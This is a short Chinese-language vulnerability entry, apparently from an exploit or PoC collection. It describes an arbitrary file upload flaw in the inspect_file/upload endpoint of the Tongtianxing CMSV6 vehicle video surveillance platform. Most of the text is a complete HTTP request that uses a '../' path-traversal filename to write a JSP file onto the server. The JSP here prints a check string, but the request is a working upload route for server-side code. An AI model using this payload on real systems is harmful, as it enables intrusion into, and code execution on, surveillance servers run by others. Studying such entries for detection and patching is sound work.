**漏洞描述：**

通天星CMSV6接口inspect_file-upload存在文件上传漏洞，攻击者可以通过拼接目录地址上传恶意文件。

**影响版本：**

通天星CMSV6车载视频监控平台

**Payload：**

```
POST/inspect_file/uploadHTTP/1.1
Host: host
User-Agent:Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding:gzip, deflate
Accept:*/*
Connection:close
Content-Length:226
Content-Type:multipart/form-data; boundary=2e7688d712bcc913201f327059f9976b

--2e7688d712bcc913201f327059f9976b
Content-Disposition: form-data; name="uploadFile"; filename="../707140.jsp"
Content-Type: application/octet-stream

<% out.println("007319607"); %>
--2e7688d712bcc913201f327059f9976b--
```

---
